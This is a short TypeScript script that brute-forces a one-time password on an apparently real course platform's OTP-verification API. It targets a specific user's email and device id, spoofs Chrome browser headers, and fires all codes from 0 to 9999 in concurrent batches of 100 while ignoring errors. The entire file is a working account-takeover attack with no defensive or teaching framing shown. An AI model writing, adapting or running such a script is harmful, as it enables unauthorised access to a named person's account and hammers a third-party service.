import axios from "axios";

async function sendRequest(otp:string) {
    let config = {
        method: 'get',
        maxBodyLength: Infinity,
        url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=davidsteaphen6%40gmail.com&otp='+otp+'&device_id=WebBrowser1761161892672kiv56v64f9j&mydeviceid=&mydeviceid2=',
        headers: { 
            'accept': '*/*', 
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7', 
            'auth-key': 'appxapi', 
            'client-service': 'Appx', 
            'origin': 'https://harkirat.classx.co.in', 
            'priority': 'u=1, i', 
            'referer': 'https://harkirat.classx.co.in/', 
            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 
            'sec-ch-ua-mobile': '?0', 
            'sec-ch-ua-platform': '"macOS"', 
            'sec-fetch-dest': 'empty', 
            'sec-fetch-mode': 'cors', 
            'sec-fetch-site': 'same-site', 
            'source': 'website', 
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
        }
    };
    try{
        await axios.request(config)
    }
    catch(e){

    }
}
async function main(){
    for(let i=0;i<9999;i+=100){
        console.log(i);
        const p = []
        for(let j=0;j<100;j++){
            p.push(sendRequest((i+j).toString()));
        }
        await Promise.all(p);
    }
}
main();